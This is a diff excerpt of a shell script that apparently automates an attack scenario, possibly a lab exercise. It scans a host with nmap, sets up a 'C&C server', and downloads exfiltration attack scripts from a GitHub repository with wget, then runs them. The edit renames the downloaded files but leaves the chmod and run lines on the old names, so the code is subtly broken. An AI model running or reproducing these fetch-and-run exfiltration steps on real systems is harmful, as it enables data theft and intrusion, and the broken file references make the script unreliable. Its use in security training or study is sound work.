@@ -22,11 +22,11 @@ nmap -sC -p- 172.18.0.2 -T4 --min-rate 10000
 # [Exfiltration] Set up C&C server
 echo "[+] Setting up C&C server..."
 
-cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_attk.sh && chmod +x exfiltration_attk.sh
+cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_exfiltration_attk.sh && chmod +x exfiltration_attk.sh
 ./exfiltration_attk.sh
 
 # [Exfiltration] Install script for attacker to decrypt and extract the exfiltrated file
-cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/after_exfiltration_attk.sh && chmod +x after_exfiltration_attk.sh
+cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_after_exfiltration_attk.sh && chmod +x after_exfiltration_attk.sh
 
 # [Initial access] Automated
 echo "[+] Setting up initial access..."
